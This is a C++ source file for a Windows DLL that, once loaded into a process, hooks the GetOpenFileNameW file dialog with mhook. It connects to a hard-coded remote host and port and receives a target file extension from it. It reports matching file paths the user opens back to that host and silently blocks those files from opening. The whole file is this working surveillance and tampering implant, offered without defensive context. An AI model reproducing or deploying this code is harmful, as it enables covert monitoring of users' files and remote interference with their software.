// ###############################
// #######  INFORMATION  #########
// ###############################
// Author: David "Shellz" Klein
// Platform: Windows 10
// Date: 23/01/2016 
// Version: Visual C++ 14
// ###############################
// #########  INCLUDES  ##########
// ###############################
#include "Engine.h"
#include "mhook.h"
#include <Commdlg.h>
#include <fstream>

#pragma comment(lib, "Engine.lib")
#pragma comment(lib, "Trampoline.lib")
// ###############################
// #########  CONSTANTS  #########
// ###############################
#define EXTENSIONS_LENGTH 16
#define EXTENSIONS "EXTENSIONS"
#define IP "192.168.1.9"
#define PORT 4000
// ###############################
// #########  GLOBALS  ###########
// ###############################
using namespace std;

typedef BOOL(WINAPI *fpGetOpenFileNameW)(LPOPENFILENAME);

HMODULE hComdlg32 = GetModuleHandle(L"Comdlg32");
fpGetOpenFileNameW TrueGetOpenFileNameW = (fpGetOpenFileNameW) GetProcAddress(hComdlg32, "GetOpenFileNameW");

bool bHooked = false;
bool bFailed = false;
bool bRecevied = false;
char szExtension[EXTENSIONS_LENGTH];
SocketObject* spSocketClient = new SocketObject();

ofstream f("C:\\test.log", ofstream::out);
// ###############################
// ########  FUNCTIONS  ##########
// ###############################
BOOL WINAPI HookGetOpenFileNameW(LPOPENFILENAME lpofn)
{
	BOOL bResult;
	char szFileName[MAX_PATH];
	try
	{
		if (!bRecevied)
		{
			spSocketClient->Send("EXTENSION");
			int iLength = spSocketClient->Recv(szExtension, EXTENSIONS_LENGTH);
			szExtension[iLength] = '\0';
			bRecevied = true;
		}
		bResult = TrueGetOpenFileNameW(lpofn);
		strcpy_s(szFileName, Encode(lpofn->lpstrFile, CP_UTF8));
		if (strstr(szFileName, szExtension))
		{
			spSocketClient->Send(szFileName);
			return FALSE;
		}
	}
	catch (SocketError error)
	{
		bFailed = true;
	}

	return bResult;
}
// ###############################
// ###########  MAIN  ############
// ###############################
BOOL APIENTRY DllMain(HMODULE hDll, DWORD dwCallReason, LPVOID lpReserved)
{
	switch (dwCallReason)
	{
		case DLL_PROCESS_ATTACH:
			if (!bHooked)
			{
				try
				{
					spSocketClient->Connect(IP, PORT);
					Mhook_SetHook((PVOID*) &TrueGetOpenFileNameW, HookGetOpenFileNameW);
					bHooked = true;
				}
				catch (SocketError error)
				{
					bFailed = true;
				}
			}
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			if (bFailed)
			{
				Mhook_Unhook((PVOID*) &TrueGetOpenFileNameW);
			}
			break;
	}
	return TRUE;
}
// ###############################
// ###########  QUIT  ############
// ###############################